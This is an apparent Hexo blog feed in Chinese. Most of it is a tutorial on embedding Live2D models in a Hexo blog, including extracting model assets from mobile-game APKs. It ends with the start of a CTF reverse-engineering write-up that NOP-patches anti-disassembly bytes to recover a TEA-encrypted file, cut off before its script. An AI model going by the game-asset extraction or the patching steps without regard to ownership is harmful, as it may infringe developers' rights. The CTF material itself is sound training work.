class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="comment">// 默认配置文件，这里用我用的100034_baozaifan为例</span></span><br><span class="line">    <span class="attr">&quot;expression&quot;</span>:[ <span class="comment">// /模型/expression文件夹内的各文件</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/chijing.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;chijing.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/haixiu.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;haixiu.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/kaixin.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;kaixin.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/idle.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;idle.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/nanguo.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;nanguo.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/shengqi.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;shengqi.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/wunai.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;wunai.exp.json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;model&quot;</span>:<span class="string">&quot;model.moc&quot;</span>, <span class="comment">// /模型文件夹的model.moc文件</span></span><br><span class="line">    <span class="attr">&quot;motions&quot;</span>:&#123; <span class="comment">// /模型/action文件夹内的各文件</span></span><br><span class="line">        <span class="attr">&quot;&quot;</span>:[</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;action/fumaozi.mtn&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;action/idle.mtn&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;action/sikao.mtn&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;textures&quot;</span>:[ <span class="comment">// /模型文件夹内的texture文件</span></span><br><span class="line">        <span class="string">&quot;texture_00.png&quot;</span></span><br><span class="line">    ],</span><br><span class="line"><span class="attr">&quot;physics&quot;</span>:<span class="string">&quot;moc/physics.json&quot;</span>, <span class="comment">// /模型/moc文件夹的physics文件</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span>:<span class="string">&quot;Sample 1.0.0&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自此对某个模型的配置完成。</p><h2 id="自己动手提取"><a href="#自己动手提取" class="headerlink" title="自己动手提取"></a>自己动手提取</h2><p>当然，如果没有在上面的仓库里找到你想用的live2d模型，可以选择自己动手提取，不过由于各种手游对live2d模型的文件规范不太一样，故可能需要稍作修改。</p><p>动手提取的方法也很简单，解压手游的apk包，然后在assets文件夹（apk包里一般用来放原生资源的地方）内搜索<code>live2d</code>，看到类似名字的文件夹就是放着资源的地方，这里还是拿食物语做例子。</p><p>apk包解压以后：</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502122532979.png"></p><p>在<code>./assets</code>中搜索<code>live2d</code>有</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502122614107.png"></p><p>可以看到这里的<code>./live2dcharacter</code>就是存放模型的地方，打开可以看到</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502122645889.png"></p><p>这些就是我们的模型啦~</p><p>当然稍作修改的地方就靠自己了hhh，可以参考那个仓库里多几个文件夹的live2d的文件布局试试。</p><h1 id="交互少的小白版live2d"><a href="#交互少的小白版live2d" class="headerlink" title="交互少的小白版live2d"></a>交互少的小白版live2d</h1><p>接下来就分两条路走啦，分别是<code>交互少的小白版live2d</code>和<code>交互多的大白版(x)live2d</code>。</p><p>本part面向<strong>懒得折腾 &#x2F; 少交互就够用</strong>的人群，如想使用博客效果中（<a href="https://c10udlnk.top/">https://c10udlnk.top/</a>）这种live2d，直接忽略这里跳到下一个part就好。</p><p>按照melody主题提供的教程（<a href="https://molunerfinn.com/hexo-theme-melody-doc/zh-Hans/additional-package-support.html#live2d%E5%8A%A8%E7%94%BB%E6%A8%A1%E5%9E%8B%E6%8C%82%E4%BB%B6">额外依赖库支持 | hexo-theme-melody</a>），在blog的根目录下运行<code>npm install --save hexo-helper-live2d</code>来安装live2d插件。</p><p>然后按照<a href="https://github.com/EYHN/hexo-helper-live2d">EYHN&#x2F;hexo-helper-live2d: Add the Sseexxyyy live2d to your hexo!</a>这里的a方法添加自定义模型。</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502124548048.png"></p><p>具体如下：</p><p>先在博客根目录下创建一个<code>/live2d_models</code>的文件夹，</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502124807487.png"></p><p>然后将刚刚下载的模型复制到该文件夹下：</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502125043478.png"></p><p>然后更改<code>/_config.yml</code>，在末尾添加：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 官方的默认例子，具体各项配置看仓库的readme</span></span><br><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">log:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">100034_baozaifan</span> <span class="comment">#要使用的模型名称（文件夹名）</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">150</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">300</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">react:</span></span><br><span class="line">    <span class="attr">opacity:</span> <span class="number">0.7</span></span><br></pre></td></tr></table></figure><p>然后更新博客就可以看到萌萌哒的live2d啦~</p><p>（温馨提示：因为缓存刷新较慢，<code>hexo d</code>部署上去以后可能要好久才能看到效果，所以可以先用<code>hexo s</code>代替<code>hexo d</code>，调整完效果以后最后再用<code>hexo d</code>部署就好。）</p><p>如果看不到模型的话一定是<strong>因为没配置好index文件（<code>.model.json</code>），手动指路$1.1</strong></p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502133515509.png"></p><h1 id="交互多的大白版-x-live2d"><a href="#交互多的大白版-x-live2d" class="headerlink" title="交互多的大白版(x)live2d"></a>交互多的大白版(x)live2d</h1><p>如果你之前运行过<code>npm install --save hexo-helper-live2d</code>安装了hexo-helper-live2d插件的话，建议使用<code>npm uninstall hexo-helper-live2d</code>将其卸载，当然<strong>如果你想拥有两只不同种类live2d</strong>，那当我没说。</p><p>本部分有参考issue<a href="https://github.com/Molunerfinn/hexo-theme-melody/issues/214">[第三方支持]加入一个更多功能的live2d · Issue #214</a>，但是因为时间久远&#x2F;版本问题对有些细节稍作修改。</p><h2 id="安装live2d-widget"><a href="#安装live2d-widget" class="headerlink" title="安装live2d-widget"></a>安装live2d-widget</h2><ol><li><p>下载<a href="https://github.com/stevenjoezhang/live2d-widget">stevenjoezhang&#x2F;live2d-widget: 把萌萌哒的看板娘抱回家 (ノ≧∇≦)ノ | Live2D widget for web platform</a>中的各文件，并解压到主题根目录source文件夹下（以melody主题为例，解压到<code>/node_modules/hexo-theme-melody/source</code>目录下；有些主题的根目录在<code>/themes/主题名/source</code>）。</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502132028912.png"></p></li><li><p>修改<code>/node_modules/hexo-theme-melody/source/live2d-widget/autoload.js</code>，将<code>const live2d_path = &quot;https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/&quot;;</code>改为<code>const live2d_path = &quot;/live2d-widget/&quot;;</code>。</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502132526638.png"></p></li><li><p>在<code>/node_modules/hexo-theme-melody/layout/includes/additional-js.pug</code>文件末尾添加<code>script(src=url_for(&#39;/live2d-widget/autoload.js&#39;))</code></p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502132743419.png"></p></li><li><p>在<code>/_config.melody.yml</code>末尾添加：</p></li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>至此便能看到项目本身自带的模型了：</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502133414267.png"></p><h2 id="常用配置说明"><a href="#常用配置说明" class="headerlink" title="常用配置说明"></a>常用配置说明</h2><p>模型的大小、位置、格式和文本内容等配置，需要自行设置<code>/node_modules/hexo-theme-melody/source/live2d-widget</code>中的<code>waifu-tips.js</code> 、<code>waifu-tips.json</code>和<code>waifu.css</code>，这里提一些各文件里常用的配置。</p><p>（这里如果用<code>hexo s</code>调整模型的话将会很方便，直接刷新就能看到最新效果）</p><p>在<a href="https://github.com/c10udlnk/someFixedConfigs/tree/main/live2d_cfgWithHexo">someFixedConfigs&#x2F;live2d_cfgWithHexo</a>放了一下自己的配置，主要针对melody主题改了一些selector，伸手党替换文件后可直接食用。</p><h3 id="waifu-tips-js"><a href="#waifu-tips-js" class="headerlink" title="waifu-tips.js"></a>waifu-tips.js</h3><p>这里是模型加载启动&#x2F;点击工具栏相应按钮时的行为和文本内容定义，具体对应可以对照参考原模型的行为，比如</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502134116740.png"></p><p>这个部分是用来显示用户点回本页面时显示的文本，其余同理。</p><h3 id="waifu-tips-json"><a href="#waifu-tips-json" class="headerlink" title="waifu-tips.json"></a>waifu-tips.json</h3><p>这里是除了上面js里定义的文本以外的其余文本内容，同样可以对照参考原模型猜测来进行修改。</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502134338823.png"></p><p>值得注意的是，这个文件里分了几大块，架构大概是：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;mouseover&quot;</span>: [&#123; <span class="comment">// 鼠标悬停在某个特定元素时显示的文本</span></span><br><span class="line"><span class="attr">&quot;selector&quot;</span>: <span class="string">&quot;...&quot;</span>,</span><br><span class="line"><span class="attr">&quot;text&quot;</span>: <span class="string">&quot;...&quot;</span></span><br><span class="line">&#125;],</span><br><span class="line"><span class="attr">&quot;click&quot;</span>: [&#123; <span class="comment">// 鼠标点击某个特定元素时显示的文本</span></span><br><span class="line"><span class="attr">&quot;selector&quot;</span>: <span class="string">&quot;...&quot;</span>,</span><br><span class="line"><span class="attr">&quot;text&quot;</span>: <span class="string">&quot;...&quot;</span></span><br><span class="line">&#125;],</span><br><span class="line"><span class="attr">&quot;seasons&quot;</span>: [&#123; <span class="comment">// 在特定日期显示的文本</span></span><br><span class="line"><span class="attr">&quot;date&quot;</span>: <span class="string">&quot;01/01&quot;</span>,</span><br><span class="line"><span class="attr">&quot;text&quot;</span>: <span class="string">&quot;...&quot;</span></span><br><span class="line">&#125;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>text</code>这里很显然是填显示的文本。</p><p><code>date</code>是指定的特定日期。</p><p>至于<code>selector</code>就类似于CSS里的<a href="https://www.w3school.com.cn/cssref/css_selectors.asp">CSS选择器</a>，是用来指定元素类型的。</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502135731220.png"></p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502214537634.png"></p><p>这里可以直接用默认的，当然更建议自己更改（因为不同主题对不同元素的tag&#x2F;class&#x2F;id好多都不一样，如果没有自定义的话用起来很多都没办法触发）。</p><h3 id="waifu-css"><a href="#waifu-css" class="headerlink" title="waifu.css"></a>waifu.css</h3><p>CSS可以堪称是改大小&#x2F;位置&#x2F;格式的重头戏，想要让模型按照自己的想法显示在页面上，就得在这一块下功夫。</p><p>（当然，CSS有些设置和布局挺玄学的，发现加了某语句没作用的情况建议自行搜索or多调试）。</p><p>这边点几个大概率需要配置的常用点，其他的可以自己查css的各种语法来调整，或者在仓库的<a href="https://github.com/stevenjoezhang/live2d-widget/issues">issue</a>里查有没有相同需求的（甚至可以自己提issue。</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502214904779.png"></p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502215144485.png"></p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502223056063.png"></p><p>（<code>#waifu #live2d</code>这里强调是画布大小，上面没标清楚懒得改了hhh）</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502223156816.png"></p><h2 id="运用CDN添加自定义模型"><a href="#运用CDN添加自定义模型" class="headerlink" title="运用CDN添加自定义模型"></a>运用CDN添加自定义模型</h2><p>当然，想要添加之前下载的自定义模型，走到这一步还不够，还得往下多走一步。</p><p>感谢<a href="http://fxizenta.design/">@Fxizenta</a> 大佬的提醒，这里参考<a href="https://blog.csdn.net/qq_38877888/article/details/103995674">使用免费CDN服务加速Github博客_Shy_tom的博客-CSDN博客</a>，用github的免费cdn服务来实现我们的自定义需求（顺便加速）。</p><blockquote><p>本来想着把api部署到博客本地上然后调用的，后来才想起来hexo博客是静态博客（不能发response包&#x3D; &#x3D;），感谢大佬提前部署到服务器上但最后没用上的api。</p></blockquote><p>先把提供的api接口仓库（<a href="https://github.com/fghrsh/live2d_api">fghrsh&#x2F;live2d_api: Live2D 看板娘插件 (https://www.fghrsh.net/post/123.html) 上使用的后端 API</a>）fork一下：</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502234947049.png"></p><p>然后在本地把这个仓库clone下来，方便通过本地更改</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502235141186.png"></p><p>依次点击，将git地址复制下来，然后在powershell运行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone 刚刚复制下来的内容</span><br></pre></td></tr></table></figure><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502235339823.png"></p><p>等clone完成以后打开文件夹，需要关注的是两个地方是<code>live2d_api/model_list.json</code>和<code>live2d_api/model</code>文件夹。</p><p><code>live2d_api/model_list.json</code>里放的是需要展示的模型列表和刚换出来时的问候语：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;models&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;model内的各模型文件夹名&quot;</span>,</span><br><span class="line">        ...</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;messages&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;对应的问候语&quot;</span>,</span><br><span class="line">        ...</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如我这边分别在末尾新增煲仔饭相关：</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210503004236824.png"></p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210503004259238.png"></p><p><code>live2d_api/model</code>文件夹则存放着模型，在这里放入我们的自定义模型：</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210503004534436.png"></p><p>这里就要把模型文件夹内之前的<code>.model.json</code>文件名改成<code>index.json</code>，并且增加一些内容（这里依旧是以煲仔饭模型为例，需要更改的地方在注释标出）：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;expression&quot;</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/chijing.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;chijing.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/haixiu.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;haixiu.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/kaixin.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;kaixin.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/idle.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;idle.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/nanguo.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;nanguo.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/shengqi.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;shengqi.exp.json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;expression/wunai.exp.json&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;wunai.exp.json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;layout&quot;</span>:&#123; <span class="comment">// 新增 调整模型位置及长宽</span></span><br><span class="line">        <span class="attr">&quot;center_x&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;center_y&quot;</span>: <span class="number">-0.16</span>,</span><br><span class="line">        <span class="attr">&quot;width&quot;</span>: <span class="number">1.8</span>,</span><br><span class="line">        <span class="attr">&quot;height&quot;</span>: <span class="number">2.5</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;hit_areas_custom&quot;</span>:&#123; <span class="comment">// 新增 模型的点击感应位置</span></span><br><span class="line">        <span class="attr">&quot;head_x&quot;</span>:[<span class="number">-0.4</span>, <span class="number">0.9</span>], <span class="comment">// 头部判定</span></span><br><span class="line">        <span class="attr">&quot;head_y&quot;</span>:[<span class="number">0.4</span>, <span class="number">0.6</span>],</span><br><span class="line">        <span class="attr">&quot;body_x&quot;</span>:[<span class="number">-0.4</span>, <span class="number">0.5</span>], <span class="comment">// 身体判定</span></span><br><span class="line">        <span class="attr">&quot;body_y&quot;</span>:[<span class="number">0.4</span>, <span class="number">-0.9</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;model&quot;</span>:<span class="string">&quot;model.moc&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;motions&quot;</span>:&#123; <span class="comment">// 有修改，新增触发对应表情时的行为</span></span><br><span class="line">        <span class="attr">&quot;idle&quot;</span>:[ <span class="comment">// 空闲时动作</span></span><br><span class="line">            &#123;<span class="attr">&quot;file&quot;</span>:<span class="string">&quot;action/idle.mtn&quot;</span>&#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;flick_head&quot;</span>:[ <span class="comment">// 点击头部时动作</span></span><br><span class="line">            &#123;<span class="attr">&quot;file&quot;</span>:<span class="string">&quot;action/fumaozi.mtn&quot;</span>&#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;tap_body&quot;</span>:[ <span class="comment">// 点击身体时动作</span></span><br><span class="line">            &#123;<span class="attr">&quot;file&quot;</span>:<span class="string">&quot;action/sikao.mtn&quot;</span>&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;textures&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;texture_00.png&quot;</span></span><br><span class="line">    ],</span><br><span class="line"><span class="attr">&quot;physics&quot;</span>:<span class="string">&quot;moc/physics.json&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>:<span class="string">&quot;Sample 1.0.0&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更改完以后将本地内容推上github上，在powershell的该目录下运行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add . ; git commit <span class="literal">-m</span> <span class="string">&quot;add new model&quot;</span> ; git push</span><br></pre></td></tr></table></figure><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210503004750884.png"></p><p>然后在github仓库这里release一下：</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210503005135961.png"></p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210503005325669.png"></p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210503005412152.png"></p><p>然后把<code>/node_modules/hexo-theme-melody/source/live2d-widget/autoload.js</code>中的：</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210503005704929.png"></p><p>改成：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdnPath: <span class="string">&quot;https://cdn.jsdelivr.net/gh/用户名/live2d_api@版本号/&quot;</span></span><br></pre></td></tr></table></figure><p>比如我这边就是：</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210503010001354.png"></p><p>（注意这里如果不行的话把用户名的大写都转成小写试试，可能是对用户名的规范使用问题）。</p><p>然后更新博客就能看到想见的人啦~</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210503010713533.png"></p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> u5eful </tag>
            
            <tag> 折腾经历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2021MAR-DASCTF_逆向</title>
      <link href="p/wpFor-2021MARDASCTF/"/>
      <url>p/wpFor-2021MARDASCTF/</url>
      
        <content type="html"><![CDATA[<p>昨天打完的MAR DASCTF，来复个盘~</p><p>不过就re做了3&#x2F;4然后有事提前开溜了hhh，拿了drinkSomeTea和replace的三血心满意足（蜜汁三血执念。</p><p>感觉这回的出题人好喜欢TEA啊（正好最近在整理加解密算法），就是TEA和XTEA都出了却不带XXTEA玩有点可惜&#x2F;doge。</p><p>扫雷也复盘完了！好耶！</p><a id="more"></a><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="drinkSomeTea"><a href="#drinkSomeTea" class="headerlink" title="drinkSomeTea"></a>drinkSomeTea</h2><p>是一个逻辑超级明显但是超——坑的题。</p><p>鉴于这是复盘，那就直击要害吧，懒得把当时兜兜转转的心路历程复述一遍了&gt;^&lt;。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328160554625.png"></p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328160608278.png"></p><p>逻辑很简单，就是将<code>./tea.png</code>（FileName&#x3D;“.&#x2F;tea.png”）的内容以二进制形式读入到<code>unk_409988</code>中，然后以8字节为单位（<code>v7+=8</code>）对其进行处理（<code>loc_4010A0</code>这里），再写入<code>./tea.png.out</code>中。而题目附件给了这个最后输出的<code>./tea.png.out</code>，需要我们还原<code>./tea.png</code>。</p><p><code>loc_4010A0</code>这里没有转函数的原因是出现了花指令干扰静态分析，nop掉（74 03 75 01 E8改成90 90 90 90 90）再重新转代码转函数即可。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328161029250.png"></p><p>然后我们就得到了<code>sub_4010A0()</code>。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328161202935.png"></p><p>很明显地可以看到是TEA加密，就是说<code>tea.png</code>经过TEA加密以后得到了<code>tea.png.out</code>。</p><p>a2是加密时的key，退回到上一层可以发现是<code>dword_407030</code>：</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328161829584.png"></p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328161837406.png"></p><p>但是如果拿平时的TEA解密脚本跑根本就行不通，当时多用了两三倍的时间去调（patch掉exit，走一遍加密流程进行对比），最后才发现是int的问题，一般TEA加解密都是uint_32的（。就是这个细节浪费了超多时间TvT</p><p>最后上解密脚本，基本上把unsigned int改成int就好（改自<a href="https://blog.csdn.net/gsls200808/article/details/48243019">TEA、XTEA、XXTEA加密解密算法_gsls200808的专栏-CSDN博客</a>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 